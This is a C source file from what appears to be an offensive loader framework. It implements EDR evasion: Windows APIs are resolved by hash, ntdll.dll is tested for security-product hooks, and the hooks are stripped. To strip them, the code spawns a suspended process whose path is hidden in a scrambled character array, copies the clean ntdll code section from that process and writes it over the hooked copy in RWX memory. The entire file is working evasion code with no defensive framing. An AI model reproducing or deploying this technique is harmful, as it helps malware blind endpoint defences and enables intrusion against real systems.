#include "../../../includes/core/core.h"
#include "../../../includes/evasion/methods/unhook-process.h"
#include "../../../includes/apis/apidefs.h"
#include "../../../includes/apis/apis.h"


BOOL evasion_unhook_ntdll_process_load_apis(void) {

    if (!g_ldr->apis->CreateProcessA)
        g_ldr->apis->CreateProcessA = (pCreateProcessA)GetProc(g_ldr->apis->modules.kernel32, HASHED_CREATEPROCESSA);
    if (!g_ldr->apis->NtProtectVirtualMemory)
        g_ldr->apis->NtProtectVirtualMemory = (pNtProtectVirtualMemory)GetProc(g_ldr->apis->modules.ntdll, HASHED_NTPROTECTVIRTUALMEMORY);
    if (!g_ldr->apis->NtReadVirtualMemory)
        g_ldr->apis->NtReadVirtualMemory = (pNtReadVirtualMemory)GetProc(g_ldr->apis->modules.ntdll, HASHED_NTREADVIRTUALMEMORY);
    if (!g_ldr->apis->NtTerminateProcess)
        g_ldr->apis->NtTerminateProcess = (pNtTerminateProcess)GetProc(g_ldr->apis->modules.ntdll, HASHED_NTTERMINATEPROCESS);
    if (!g_ldr->apis->NtCloseHandle)
        g_ldr->apis->NtCloseHandle = (pNtCloseHandle)GetProc(g_ldr->apis->modules.ntdll, HASHED_NTCLOSE);

    return (g_ldr->apis->CreateProcessA && g_ldr->apis->NtProtectVirtualMemory &&
        g_ldr->apis->NtReadVirtualMemory && g_ldr->apis->NtTerminateProcess && g_ldr->apis->NtCloseHandle);
}

BOOL is_ntdll_hooked() {
    FARPROC addr = GetProc(g_ldr->apis->modules.ntdll, HASHED_NTALLOCATEVIRTUALMEMORY);
    BYTE clean[] = { 0x4C, 0x8B, 0xD1, 0xB8 };
    PBYTE func = (PBYTE)addr;

    for (int i = 0; i < sizeof(clean); i++) {
        if (func[i] != clean[i]) return TRUE;
    }
    return FALSE;
}

BOOL evasion_unhook_ntdll_process(void) {
    if (!is_ntdll_hooked()) return TRUE;
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };
    CHAR p[35];
    p[28] = 'h';
    p[7] = 'w';
    p[19] = 't';
    p[0] = 'C';
    p[33] = 'e';
    p[14] = '3';
    p[3] = 'W';
    p[22] = '\\';
    p[11] = 'y';
    p[31] = 'x';
    p[1] = ':';
    p[17] = 'S';
    p[26] = 'o';
    p[6] = 's';
    p[9] = 'n';
    p[24] = 'c';
    p[13] = 'm';
    p[2] = '\\';
    p[30] = '.';
    p[8] = 'i';
    p[20] = 'e';
    p[5] = 'o';
    p[16] = '\\';
    p[29] = 's';
    p[34] = '\0';
    p[23] = 's';
    p[10] = 'd';
    p[25] = 'h';
    p[4] = 'i';
    p[32] = 'e';
    p[15] = '2';
    p[21] = 'm';
    p[27] = 's';
    p[12] = 's';
    p[18] = 'y';
    g_ldr->apis->CreateProcessA(p, NULL, NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);

    if (!pi.hProcess) return FALSE;

    PBYTE ntdll = (PBYTE)g_ldr->apis->modules.ntdll;
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)ntdll;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(ntdll + dos->e_lfanew);
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(nt);

    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (strcmp((char*)section[i].Name, ".text") == 0) {
            DWORD textSize = section[i].Misc.VirtualSize;
            PBYTE textAddr = ntdll + section[i].VirtualAddress;

            PBYTE cleanBuf = (PBYTE)g_ldr->apis->LocalAlloc(LMEM_FIXED, textSize);
            if (!cleanBuf) break;

            SIZE_T bytesRead = 0;
            g_ldr->apis->NtReadVirtualMemory(pi.hProcess, textAddr, cleanBuf, textSize, &bytesRead);

            PVOID protectAddr = textAddr;
            SIZE_T protectSize = textSize;
            ULONG old = 0;
            NTSTATUS status = g_ldr->apis->NtProtectVirtualMemory(
                (HANDLE)-1, &protectAddr, &protectSize,
                PAGE_EXECUTE_READWRITE, &old);
            if (status != 0) {
                DBGA("NtProtectVirtualMemory 1 failed: 0x%lx\n", status);
                g_ldr->apis->LocalFree(cleanBuf);
                return FALSE;
            }

            memcpy(textAddr, cleanBuf, textSize);

            protectAddr = textAddr;
            protectSize = textSize;
            status = g_ldr->apis->NtProtectVirtualMemory(
                (HANDLE)-1, &protectAddr, &protectSize,
                old, &old);
            if (status != 0) {
                DBGA("NtProtectVirtualMemory 2 failed: 0x%lx\n", status);
                g_ldr->apis->LocalFree(cleanBuf);
                return FALSE;
            }

            DBGA("[*] Unhooked ntdll via suspended process\n");
            g_ldr->apis->LocalFree(cleanBuf);
            break;
        }
    }

    g_ldr->apis->NtTerminateProcess(pi.hProcess, 0);
    g_ldr->apis->NtCloseHandle(pi.hProcess);
    g_ldr->apis->NtCloseHandle(pi.hThread);

    return TRUE;
}

